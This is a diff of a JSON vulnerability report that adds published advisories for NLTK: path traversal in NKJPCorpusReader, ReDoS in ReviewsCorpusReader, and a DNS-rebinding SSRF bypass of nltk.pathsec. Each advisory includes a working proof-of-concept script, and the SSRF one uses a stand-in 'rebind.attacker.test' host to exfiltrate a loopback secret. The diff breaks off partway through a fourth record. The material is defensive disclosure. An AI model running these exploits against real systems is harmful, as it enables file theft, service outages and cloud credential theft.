@@ -10115,6 +10115,54 @@
             },
             {
               "ids": [
+                "PYSEC-2026-3581",
+                "GHSA-6hm5-jgcp-p838"
+              ],
+              "aliases": [
+                "CVE-2026-12072",
+                "GHSA-6hm5-jgcp-p838",
+                "PYSEC-2026-3581"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "PYSEC-2026-3582",
+                "GHSA-fg7f-2386-8897"
+              ],
+              "aliases": [
+                "CVE-2026-12061",
+                "GHSA-fg7f-2386-8897",
+                "PYSEC-2026-3582"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "PYSEC-2026-3583",
+                "GHSA-qvv7-cg9c-w4x3"
+              ],
+              "aliases": [
+                "CVE-2026-12075",
+                "GHSA-qvv7-cg9c-w4x3",
+                "PYSEC-2026-3583"
+              ],
+              "max_severity": "8.6"
+            },
+            {
+              "ids": [
+                "PYSEC-2026-3584",
+                "GHSA-xh95-f55m-82fw"
+              ],
+              "aliases": [
+                "CVE-2026-12074",
+                "GHSA-xh95-f55m-82fw",
+                "PYSEC-2026-3584"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
                 "PYSEC-2026-597"
               ],
               "aliases": [
@@ -10171,52 +10219,12 @@
             },
             {
               "ids": [
-                "GHSA-6hm5-jgcp-p838"
-              ],
-              "aliases": [
-                "CVE-2026-12072",
-                "GHSA-6hm5-jgcp-p838"
-              ],
-              "max_severity": "7.5"
-            },
-            {
-              "ids": [
-                "GHSA-fg7f-2386-8897"
-              ],
-              "aliases": [
-                "CVE-2026-12061",
-                "GHSA-fg7f-2386-8897"
-              ],
-              "max_severity": "7.5"
-            },
-            {
-              "ids": [
-                "GHSA-qvv7-cg9c-w4x3"
-              ],
-              "aliases": [
-                "CVE-2026-12075",
-                "GHSA-qvv7-cg9c-w4x3"
-              ],
-              "max_severity": "8.6"
-            },
-            {
-              "ids": [
                 "GHSA-rf74-v2fm-23pw"
               ],
               "aliases": [
                 "GHSA-rf74-v2fm-23pw"
               ],
               "max_severity": "5.1"
-            },
-            {
-              "ids": [
-                "GHSA-xh95-f55m-82fw"
-              ],
-              "aliases": [
-                "CVE-2026-12074",
-                "GHSA-xh95-f55m-82fw"
-              ],
-              "max_severity": "7.5"
             }
           ],
           "vulnerabilities": [
@@ -11350,6 +11358,534 @@
               "affected": [
                 {
                   "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3581.yaml"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "nltk",
+                    "purl": "pkg:pypi/nltk"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.10.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.8",
+                    "0.9",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9",
+                    "2.0.1",
+                    "2.0.1rc1",
+                    "2.0.1rc2-git",
+                    "2.0.1rc3",
+                    "2.0.1rc4",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0b4",
+                    "2.0b5",
+                    "2.0b6",
+                    "2.0b7",
+                    "2.0b8",
+                    "2.0b9",
+                    "3.0.0",
+                    "3.0.0b1",
+                    "3.0.0b2",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.2.3",
+                    "3.2.4",
+                    "3.2.5",
+                    "3.3",
+                    "3.4",
+                    "3.4.1",
+                    "3.4.2",
+                    "3.4.3",
+                    "3.4.4",
+                    "3.4.5",
+                    "3.5",
+                    "3.5b1",
+                    "3.6",
+                    "3.6.1",
+                    "3.6.2",
+                    "3.6.3",
+                    "3.6.4",
+                    "3.6.5",
+                    "3.6.6",
+                    "3.6.7",
+                    "3.7",
+                    "3.8",
+                    "3.8.1",
+                    "3.9",
+                    "3.9.1",
+                    "3.9.2",
+                    "3.9.3",
+                    "3.9.4",
+                    "3.9b1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-12072",
+                "GHSA-6hm5-jgcp-p838"
+              ],
+              "details": "### Summary\n   A path-traversal vulnerability in `NKJPCorpusReader` allows an attacker who can\n   influence the `fileids` argument of its public read methods (`header`, `raw`,\n   `words`, `sents`, `tagged_words`) to read files outside the corpus root. The\n   reader builds the file path with no containment check and opens it with the\n   builtin `open()`, so it bypasses NLTK's `nltk.pathsec` sandbox — including the\n   strict `ENFORCE = True` mode that `SECURITY.md` recommends for web/multi-tenant\n   deployments. `header()` returns the parsed content of the out-of-root file to\n   the caller (arbitrary file read).\n\n   ### Details\n   `SECURITY.md` promises that file access is \"validated against allowed NLTK data\n   directories\" and that with `nltk.pathsec.ENFORCE = True` \"unauthorized file\n   access … will raise `PermissionError`.\" That guarantee is enforced via\n   `FileSystemPathPointer.open()` / `CorpusReader.open()`, which call\n   `nltk.pathsec.validate_path(...)`.\n\n   `NKJPCorpusReader` never uses that protected path. In\n   `nltk/corpus/reader/nkjp.py`:\n\n   - `add_root()` builds the path by **plain string concatenation** with no\n     normalization or containment check:\n     ```python\n     def add_root(self, fileid):          # lines 96-102\n         if self.root in fileid:\n             return fileid                # attacker-controlled value returned unchanged\n         return self.root + fileid        # plain concat, '..' not stripped\n     ```\n   - The header view appends a fixed basename and passes the string straight into\n     the corpus view (which opens it with the builtin `open()`):\n     ```python\n     class NKJPCorpus_Header_View(XMLCorpusView):   # line 181\n         def __init__(self, filename, **kwargs):\n             XMLCorpusView.__init__(self, filename + \"header.xml\", self.tagspec)  # line 189\n     ```\n   - The other modes reach the filesystem through `XML_Tool`, which uses a raw\n     `os.path.join` (not the hardened `FileSystemPathPointer.join()`) and the\n     builtin `open()`:\n     ```python\n     class XML_Tool:                                  # line 243\n         def __init__(self, root, filename):\n             self.read_file = os.path.join(root, filename)   # line 251\n         def build_preprocessed_file(self):\n             fr = open(self.read_file)                        # line 256 — pathsec never consulted\n     ```\n\n   Because `open()` is the builtin (not `PathPointer.open()`), the `pathsec`\n   sentinel is never invoked, so `ENFORCE = True` does not block the access. For\n   comparison, the safe API `CorpusReader.open()` (`nltk/corpus/reader/api.py:222`)\n   rejects `..`/absolute fileids and calls `validate_path(..., required_root=...)`\n   before opening — `NKJPCorpusReader` simply does not go through it.\n\n   ### PoC\n   Tested against `nltk==3.9.4` (latest PyPI release) and current `develop`.\n\n   ```\n   pip install \"nltk==3.9.4\"\n   python3 poc.py\n   ```\n\n   `poc.py`:\n   ```python\n   import builtins, os, shutil, tempfile, warnings\n   warnings.simplefilter(\"ignore\")\n   import nltk, nltk.pathsec as pathsec\n   from nltk.corpus.reader.nkjp import NKJPCorpusReader\n\n   print(\"nltk\", nltk.__version__)\n\n   # A legitimate, empty NKJP corpus root (what a real app has).\n   root = tempfile.mkdtemp(prefix=\"nkjp_corpus_root_\")\n   os.makedirs(os.path.join(root, \"sample\"), exist_ok=True)\n   open(os.path.join(root, \"sample\", \"header.xml\"), \"w\").write(\"\u003cx/\u003e\")\n\n   # The attacker's target: a file OUTSIDE the corpus root.\n   secret_dir = tempfile.mkdtemp(prefix=\"OUTSIDE_ROOT_\")\n   open(os.path.join(secret_dir, \"header.xml\"), \"w\").write(\n   \"\u003cteiHeader\u003e\u003cfileDesc\u003e\u003csourceDesc\u003e\u003cbibl\u003e\"\n   \"\u003ctitle\u003eSECRET-API-KEY=sk-live-DEADBEEF\u003c/title\u003e\"\n       \"\u003c/bibl\u003e\u003c/sourceDesc\u003e\u003c/fileDesc\u003e\u003c/teiHeader\u003e\")\n\n   # Enable the strict mode SECURITY.md recommends for web / multi-tenant.\n   pathsec.ENFORCE = True\n   print(\"ENFORCE =\", pathsec.ENFORCE)\n\n   # Prove the out-of-root read and that pathsec is never consulted.\n   opened = []; real = builtins.open\n   builtins.open = lambda f, *a, **k: (opened.append(str(f)), real(f, *a, **k))[1]\n\n   reader = NKJPCorpusReader(root=root + \"/\", fileids=\"sample\")\n   # Attacker-controlled `fileids`; '..' escapes the corpus root:\n   evil = root + \"/../../../../../../..\" + secret_dir + \"/\"\n   try:\n       result = reader.header(fileids=[evil])\n   finally:\n       builtins.open = real\n\n   print(\"opened outside root:\", [p for p in opened if \"OUTSIDE_ROOT_\" in p][:1])\n   print(\"disclosed content  :\", result[0][\"title\"])\n   shutil.rmtree(root, ignore_errors=True); shutil.rmtree(secret_dir, ignore_errors=True)\n   ```\n\n   Output (unmodified):\n   ```\n   nltk 3.9.4\n   ENFORCE = True\n   opened outside root: ['/tmp/nkjp_corpus_root_XXXX/../../../../../../../tmp/OUTSIDE_ROOT_YYYY/header.xml']\n   disclosed content  : SECRET-API-KEY=sk-live-DEADBEEF\n   ```\n   With `ENFORCE = True`, NLTK opened a file outside the corpus root via the\n   builtin `open()` (no `PermissionError`, no warning) and returned its content.\n\n   ### Impact\n   This is a path traversal (CWE-22) leading to arbitrary file read. Any\n   application that passes attacker-influenced values into `NKJPCorpusReader`'s\n   `fileids` (e.g. letting a user choose which corpus document to read) is\n   affected; the attacker can escape the corpus root and read files elsewhere on\n   the host, defeating the `ENFORCE=True` sandbox.\n\n   Honest scoping: `header()` discloses the content of out-of-root files named\n   `header.xml` containing NKJP header XML. `raw()`/`words()`/`sents()` also open\n   and read an arbitrary out-of-root file (proven by intercepting `open()`), but a\n   separate pre-existing bug in `XML_Tool` (writing `str` to a binary\n   `NamedTemporaryFile`) suppresses their return value on current Python, so for\n   those modes the impact is arbitrary file open/read. The attacker chooses the\n   directory freely; a fixed basename is appended per mode. The same\n   \"build-path-then-builtin-open, skipping pathsec\" anti-pattern also appears in\n   `xmldocs.py:161`, `util.py:212,215`, `crubadan.py:78,97`, `lin.py:43`,\n   `ipipan.py:191`, `pl196x.py:110` and is worth fixing as a class.",
+              "id": "PYSEC-2026-3581",
+              "modified": "2026-08-04T14:30:27.310060997Z",
+              "published": "2026-08-04T11:34:45.986151Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nltk/nltk/security/advisories/GHSA-6hm5-jgcp-p838"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nltk/nltk"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://pypi.org/project/nltk"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-6hm5-jgcp-p838"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12072"
+                }
+              ],
+              "schema_version": "1.8.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Natural Language Toolkit (NLTK): Path Traversal in NKJPCorpusReader leads to Arbitrary File Read and bypasses the nltk.pathsec sandbox (ENFORCE=True)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3582.yaml"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "nltk",
+                    "purl": "pkg:pypi/nltk"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.10.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.8",
+                    "0.9",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9",
+                    "2.0.1",
+                    "2.0.1rc1",
+                    "2.0.1rc2-git",
+                    "2.0.1rc3",
+                    "2.0.1rc4",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0b4",
+                    "2.0b5",
+                    "2.0b6",
+                    "2.0b7",
+                    "2.0b8",
+                    "2.0b9",
+                    "3.0.0",
+                    "3.0.0b1",
+                    "3.0.0b2",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.2.3",
+                    "3.2.4",
+                    "3.2.5",
+                    "3.3",
+                    "3.4",
+                    "3.4.1",
+                    "3.4.2",
+                    "3.4.3",
+                    "3.4.4",
+                    "3.4.5",
+                    "3.5",
+                    "3.5b1",
+                    "3.6",
+                    "3.6.1",
+                    "3.6.2",
+                    "3.6.3",
+                    "3.6.4",
+                    "3.6.5",
+                    "3.6.6",
+                    "3.6.7",
+                    "3.7",
+                    "3.8",
+                    "3.8.1",
+                    "3.9",
+                    "3.9.1",
+                    "3.9.2",
+                    "3.9.3",
+                    "3.9.4",
+                    "3.9b1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-12061",
+                "GHSA-fg7f-2386-8897"
+              ],
+              "details": "### Summary\n`ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`. \n\n\n### Details\nThe label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.\n\n### PoC\n```\nimport multiprocessing as mp\nimport re\nimport time\n\n# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---\nFEATURES_VULN = re.compile(r\"((?:(?:\\w+\\s)+)?\\w+)\\[((?:\\+|\\-)\\d)\\]\")\n\n# --- Bounded variant from the fix (PR #3583): cap the per-label word run.\n#     A generous bound (real feature labels are short noun phrases) makes the\n#     run linear while never affecting legitimate corpora. ---\nWORD_BOUND = 50\nFEATURES_FIXED = re.compile(\n    r\"((?:(?:\\w+\\s){0,%d})?\\w+)\\[((?:\\+|\\-)\\d)\\]\" % WORD_BOUND\n)\n\nTIMEOUT = 20.0  # seconds, per measurement\nSIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line\n\n\ndef _bad_line(n_words):\n    \"\"\"A long line of plain words with NO trailing bracketed annotation.\"\"\"\n    return (\"word \" * n_words).rstrip()\n\n\ndef _worker(pattern_str, line, q):\n    pat = re.compile(pattern_str)\n    t0 = time.perf_counter()\n    pat.findall(line)\n    q.put(time.perf_counter() - t0)\n\n\ndef timed_findall(pattern, line, timeout=TIMEOUT):\n    \"\"\"Run pattern.findall(line) in a killable process; return seconds or None (timeout).\"\"\"\n    q = mp.Queue()\n    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))\n    p.start()\n    p.join(timeout)\n    if p.is_alive():\n        p.terminate()\n        p.join()\n        return None\n    return q.get() if not q.empty() else None\n\n\ndef bench(label, pattern):\n    print(f\"\\n[{label}]  pattern: {pattern.pattern}\")\n    print(f\"  {'words':\u003e7} {'~bytes':\u003e8}   {'time':\u003e12}   {'x prev':\u003e7}\")\n    prev = None\n    for n in SIZES:\n        line = _bad_line(n)\n        t = timed_findall(pattern, line)\n        if t is None:\n            print(f\"  {n:\u003e7} {len(line):\u003e8}   {'\u003e%.0fs TIMEOUT' % TIMEOUT:\u003e12}   {'--':\u003e7}\")\n            prev = None\n        else:\n            ratio = f\"{t/prev:.1f}x\" if prev else \"--\"\n            print(f\"  {n:\u003e7} {len(line):\u003e8}   {t*1000:\u003e9.1f} ms   {ratio:\u003e7}\")\n            prev = t\n\n\ndef parity_check():\n    \"\"\"The bound must NOT change extraction on a realistic annotated line.\"\"\"\n    real = (\n        \"the picture quality[+2] and battery life[+1] are great but \"\n        \"the lens cap[-1] feels cheap and the menu system[-2] is slow\"\n    )\n    a = FEATURES_VULN.findall(real)\n    b = FEATURES_FIXED.findall(real)\n    print(\"\\n[parity] realistic annotated line — extraction must be identical\")\n    print(f\"  vulnerable regex -\u003e {a}\")\n    print(f\"  bounded   regex  -\u003e {b}\")\n    print(f\"  identical: {a == b}\")\n    return a == b\n\n\ndef main():\n    print(\"=\" * 66)\n    print(\" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)\")\n    print(\"=\" * 66)\n    print(f\" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}\")\n\n    bench(\"VULNERABLE  reviews.py L70-71\", FEATURES_VULN)\n    bench(\"BOUNDED     fix #3583\", FEATURES_FIXED)\n    same = parity_check()\n\n    print(\"\\n\" + \"=\" * 66)\n    print(\" Vulnerable: ~4x time per input doubling  =\u003e O(n^2) quadratic ReDoS\")\n    print(\" Bounded:    ~2x time per input doubling  =\u003e O(n)   linear, stays in ms\")\n    print(f\" Extraction parity on real annotations preserved: {same}\")\n    print(\" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().\")\n    print(\"=\" * 66)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Impact\nDenial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.",
+              "id": "PYSEC-2026-3582",
+              "modified": "2026-08-04T14:30:27.317719126Z",
+              "published": "2026-08-04T11:34:46.033806Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nltk/nltk"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://pypi.org/project/nltk"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-fg7f-2386-8897"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12061"
+                }
+              ],
+              "schema_version": "1.8.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3583.yaml"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "nltk",
+                    "purl": "pkg:pypi/nltk"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.10.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.8",
+                    "0.9",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9",
+                    "2.0.1",
+                    "2.0.1rc1",
+                    "2.0.1rc2-git",
+                    "2.0.1rc3",
+                    "2.0.1rc4",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0b4",
+                    "2.0b5",
+                    "2.0b6",
+                    "2.0b7",
+                    "2.0b8",
+                    "2.0b9",
+                    "3.0.0",
+                    "3.0.0b1",
+                    "3.0.0b2",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.2.3",
+                    "3.2.4",
+                    "3.2.5",
+                    "3.3",
+                    "3.4",
+                    "3.4.1",
+                    "3.4.2",
+                    "3.4.3",
+                    "3.4.4",
+                    "3.4.5",
+                    "3.5",
+                    "3.5b1",
+                    "3.6",
+                    "3.6.1",
+                    "3.6.2",
+                    "3.6.3",
+                    "3.6.4",
+                    "3.6.5",
+                    "3.6.6",
+                    "3.6.7",
+                    "3.7",
+                    "3.8",
+                    "3.8.1",
+                    "3.9",
+                    "3.9.1",
+                    "3.9.2",
+                    "3.9.3",
+                    "3.9.4",
+                    "3.9b1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-12075",
+                "GHSA-qvv7-cg9c-w4x3"
+              ],
+              "details": "### Summary\n`nltk.pathsec` provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict `ENFORCE` mode for security-sensitive environments. The filter is bypassable by DNS rebinding: `validate_network_url()` resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under `nltk.pathsec.ENFORCE = True`.\n\n\n### Details\n`urlopen()` validates, then hands the raw hostname to `urllib`, which performs a second name resolution deep in the connection layer (`http.client.HTTPConnection.connect` → `socket.create_connection` → `socket.getaddrinfo`). The validation-side and connection-side resolutions are fully independent code paths with independent caches:\n\n1. `validate_network_url()` calls `_resolve_hostname(parsed.hostname)` and checks each returned IP against loopback/link-local/multicast/private, blocking under `ENFORCE`. (Resolution #1.)\n2. `urlopen()` then calls `build_opener(...).open(url)` with the original URL (raw hostname), so `urllib` resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)\n\n`_resolve_hostname` is decorated with `lru_cache` and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's `getaddrinfo` does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.\n\n\n### PoC\n```python\nimport socket\nimport threading\nimport warnings\nfrom collections import defaultdict\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nwarnings.filterwarnings(\"ignore\")\n\nimport nltk\nimport nltk.pathsec as ps\n\nps.ENFORCE = True  # the documented strict SSRF sandbox\n\nATTACKER_HOST = \"rebind.attacker.test\"   # attacker-controlled authoritative DNS\nPUBLIC_IP = \"93.184.216.34\"              # public address served for the validation lookup\nSECRET = b\"TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS\"\n\n\n# --- A loopback-only \"internal service\" (stands in for 169.254.169.254 / admin UI) ---\nclass _Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"text/plain\")\n        self.send_header(\"Content-Length\", str(len(SECRET)))\n        self.end_headers()\n        self.wfile.write(SECRET)\n\n    def log_message(self, *a):\n        pass\n\n\ndef start_internal_server():\n    srv = HTTPServer((\"127.0.0.1\", 0), _Handler)\n    threading.Thread(target=srv.serve_forever, daemon=True).start()\n    return srv.server_address[1]  # ephemeral port\n\n\n# --- Model the TTL-0 rebinding record at the resolver layer ---\n_real_getaddrinfo = socket.getaddrinfo\n_lookups = defaultdict(int)\n\n\ndef _rebinding_getaddrinfo(host, port, *args, **kwargs):\n    if host == ATTACKER_HOST:\n        n = _lookups[host]\n        _lookups[host] += 1\n        ip = PUBLIC_IP if n == 0 else \"127.0.0.1\"   # 1st=public (validate), then loopback (connect)\n        p = port if isinstance(port, int) else 0\n        kind = \"VALIDATION -\u003e public\" if n == 0 else \"CONNECT    -\u003e loopback\"\n        print(f\"    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})\")\n        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, \"\", (ip, p))]\n    return _real_getaddrinfo(host, port, *args, **kwargs)\n\n\ndef fetch(url):\n    with ps.urlopen(url, timeout=5) as r:\n        return r.read()\n\n\ndef main():\n    print(\"=\" * 62)\n    print(f\" NLTK pathsec DNS-rebinding SSRF bypass PoC\")\n    print(f\" nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}\")\n    print(\"=\" * 62)\n\n    port = start_internal_server()\n    print(f\"[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\\n\")\n\n    socket.getaddrinfo = _rebinding_getaddrinfo\n    ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process\n    try:\n        # ---- Control: a DIRECT loopback URL must be blocked by the filter ----\n        print(\"[1] CONTROL: direct loopback URL (filter must block this)\")\n        direct = f\"http://127.0.0.1:{port}/\"\n        try:\n            fetch(direct)\n            print(f\"    [?] unexpected: {direct} was NOT blocked\\n\")\n            control_ok = False\n        except PermissionError as e:\n            print(f\"    [OK] blocked -\u003e PermissionError: {e}\\n\")\n            control_ok = True\n\n        # ---- Attack: rebinding hostname bypasses the same filter ----\n        print(\"[2] ATTACK: rebinding hostname (public at validate, loopback at connect)\")\n        evil = f\"http://{ATTACKER_HOST}:{port}/\"\n        print(f\"    fetching {evil}\")\n        try:\n            body = fetch(evil)\n            leaked = SECRET in body\n            print(f\"    body returned to caller: {body!r}\")\n            if leaked:\n                print(\"\\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen\")\n                print(f\"         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1\")\n                print(f\"         non-blind SSRF despite ENFORCE = {ps.ENFORCE}\")\n                verdict = \"VULNERABLE\"\n            else:\n                print(\"\\n  [?] fetch succeeded but secret marker not present\")\n                verdict = \"INCONCLUSIVE\"\n        except PermissionError as e:\n            # Patched build: validate against the connect-time IP (or pin/resolve-once).\n            print(f\"\\n  [SAFE] blocked -\u003e PermissionError: {e}\")\n            verdict = \"NOT VULNERABLE\"\n    finally:\n        socket.getaddrinfo = _real_getaddrinfo\n\n    print(\"\\n\" + \"=\" * 62)\n    print(f\" Control (direct loopback blocked): {control_ok}\")\n    print(f\" Result: {verdict}   (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 62)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Impact\n- **Full-response (non-blind) SSRF.** Because the fetched body is returned to the caller (e.g. `nltk.data.load` with `format=\"raw\"`), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise.\n- **Bypass of an explicit security control.** It defeats the `nltk.pathsec` SSRF filter, including the `ENFORCE` mode that NLTK's documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the `lru_cache` annotation claiming to mitigate rebinding makes the false assurance worse.",
+              "id": "PYSEC-2026-3583",
+              "modified": "2026-08-04T14:30:27.356191660Z",
+              "published": "2026-08-04T11:34:46.082677Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nltk/nltk"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://pypi.org/project/nltk"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-qvv7-cg9c-w4x3"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12075"
+                }
+              ],
+              "schema_version": "1.8.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Natural Language Toolkit (NLTK): DNS-rebinding SSRF filter bypass in nltk.pathsec.urlopen (nltk.download / nltk.data.load) defeats ENFORCE mode"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3584.yaml"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "nltk",
+                    "purl": "pkg:pypi/nltk"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.10.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.8",
+                    "0.9",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9",
+                    "2.0.1",
+                    "2.0.1rc1",
+                    "2.0.1rc2-git",
+                    "2.0.1rc3",
+                    "2.0.1rc4",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0b4",
+                    "2.0b5",
+                    "2.0b6",
+                    "2.0b7",
+                    "2.0b8",
+                    "2.0b9",
+                    "3.0.0",
+                    "3.0.0b1",
+                    "3.0.0b2",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.1",
+                    "3.2",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.2.3",
+                    "3.2.4",
+                    "3.2.5",
+                    "3.3",
+                    "3.4",
+                    "3.4.1",
+                    "3.4.2",
+                    "3.4.3",
+                    "3.4.4",
+                    "3.4.5",
+                    "3.5",
+                    "3.5b1",
